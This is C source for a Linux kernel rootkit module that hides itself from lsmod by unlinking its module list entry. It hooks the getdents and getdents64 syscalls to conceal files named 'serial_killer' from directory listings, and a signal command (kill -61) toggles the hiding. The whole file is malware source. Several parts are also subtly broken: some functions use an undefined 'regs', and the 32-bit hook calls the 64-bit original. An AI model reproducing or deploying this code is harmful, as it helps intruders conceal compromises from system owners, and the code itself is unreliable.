#include <linux/syscalls.h>
#include <linux/namei.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/module.h>
#include "../utils/version_handler.h"

/* DESCRIPTION
* Handles the presence of this rootkit - Hides from lsmod and ls
*
* Hide Presence: kill -61 0
* Show Presence: kill -61 1
*/

/* GLOBAL VARIABLES */
struct list_head *previous_module;
/**********************************/

/* FUNCTION PROTOTYPES */
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
static asmlinkage int hook_getdents64(const struct pt_regs *regs);
static asmlinkage long (*orig_getdents)(const struct pt_regs *regs);
static asmlinkage int hook_getdents(const struct pt_regs *regs);

#else
static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
#endif

void show_lsmod(void);
void hide_lsmod(void);
/******************************************************************************************************************/

void show_lsmod(void) {
    list_add(&THIS_MODULE->list, previous_module);
    return;
}

void hide_lsmod(void) {
    previous_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    return;
}

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage int hook_getdents64(const struct pt_regs *regs){

    int err;

    /* Intermediate structures for looping through the directory listing*/
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* Get the arguments passed to sys_getdents64 */
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    /* Calling orig_getdents64 to get the total record length of the listing*/
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if (ret <= 0 || dirent_ker == NULL){
        goto done;
    }

    /* Copy the argument 'dirent' passed to sys_getdents64 from userspace to kernel space*/
    err = copy_from_user(dirent_ker, dirent, ret);
    if (err) {
        goto done;
    }

    /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
    while (offset < ret) {
        /* First iteration looks at dirent_ker + 0, which is the */
        current_dir = (void *)dirent_ker + offset;

        /* Compare current_dir->d_name to our string*/
        if (memcmp("serial_killer", current_dir->d_name, strlen("serial_killer")) == 0) {
            
            /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
            previous_dir->d_reclen += current_dir->d_reclen;
        } else {
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }

    /* Copy our altered dirent structure back to userspace so it can be returned.*/
    err = copy_to_user(dirent, dirent_ker, ret);
    if (err) {
        goto done;
    }

done:
    kfree(dirent_ker);
    return ret;
} 

static asmlinkage int hook_getdents(const struct pt_regs *regs){

    const struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };

    int err;

    /* Intermediate structures for looping through the directory listing*/
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* Get the arguments passed to sys_getdents64 */
    struct linux_dirent __user *dirent = (struct linux_dirent *)regs->si;

    /* Calling orig_getdents64 to get the total record length of the listing*/
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if (ret <= 0 || dirent_ker == NULL){
        goto done;
    }

    /* Copy the argument 'dirent' passed to sys_getdents64 from userspace to kernel space*/
    err = copy_from_user(dirent_ker, dirent, ret);
    if (err) {
        goto done;
    }

    /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
    while (offset < ret) {
        /* First iteration looks at dirent_ker + 0, which is the */
        current_dir = (void *)dirent_ker + offset;

        /* Compare current_dir->d_name to our string*/
        if (memcmp("serial_killer", current_dir->d_name, strlen("serial_killer")) == 0) {
            
            /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
            previous_dir->d_reclen += current_dir->d_reclen;
        } else {
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }

    /* Copy our altered dirent structure back to userspace so it can be returned.*/
    err = copy_to_user(dirent, dirent_ker, ret);
    if (err) {
        goto done;
    }

done:
    kfree(dirent_ker);
    return ret;
}

#else
static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count){
    

    int err;

    /* Intermediate structures for looping through the directory listing*/
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* Calling orig_getdents64 to get the total record length of the listing*/
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if (ret <= 0 || dirent_ker == NULL){
        goto done;
    }

    /* Copy the argument 'dirent' passed to sys_getdents64 from userspace to kernel space*/
    err = copy_from_user(dirent_ker, dirent, ret);
    if (err) {
        goto done;
    }

    /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
    while (offset < ret) {
        /* First iteration looks at dirent_ker + 0, which is the */
        current_dir = (void *)dirent_ker + offset;

        /* Compare current_dir->d_name to our string*/
        if (memcmp("serial_killer", current_dir->d_name, strlen("serial_killer")) == 0) {
            
            /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
            previous_dir->d_reclen += current_dir->d_reclen;
        } else {
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }

    /* Copy our altered dirent structure back to userspace so it can be returned.*/
    err = copy_to_user(dirent, dirent_ker, ret);
    if (err) {
        goto done;
    }

done:
    kfree(dirent_ker);
    return ret;

}

static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count){
    
    const struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };

    int err;

    /* Intermediate structures for looping through the directory listing*/
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* Calling orig_getdents64 to get the total record length of the listing*/
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if (ret <= 0 || dirent_ker == NULL){
        goto done;
    }

    /* Copy the argument 'dirent' passed to sys_getdents64 from userspace to kernel space*/
    err = copy_from_user(dirent_ker, dirent, ret);
    if (err) {
        goto done;
    }

    /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
    while (offset < ret) {
        /* First iteration looks at dirent_ker + 0, which is the */
        current_dir = (void *)dirent_ker + offset;

        /* Compare current_dir->d_name to our string*/
        if (memcmp("serial_killer", current_dir->d_name, strlen("serial_killer")) == 0) {
            
            /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
            previous_dir->d_reclen += current_dir->d_reclen;
        } else {
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }

    /* Copy our altered dirent structure back to userspace so it can be returned.*/
    err = copy_to_user(dirent, dirent_ker, ret);
    if (err) {
        goto done;
    }

done:
    kfree(dirent_ker);
    return ret;
}

#endif


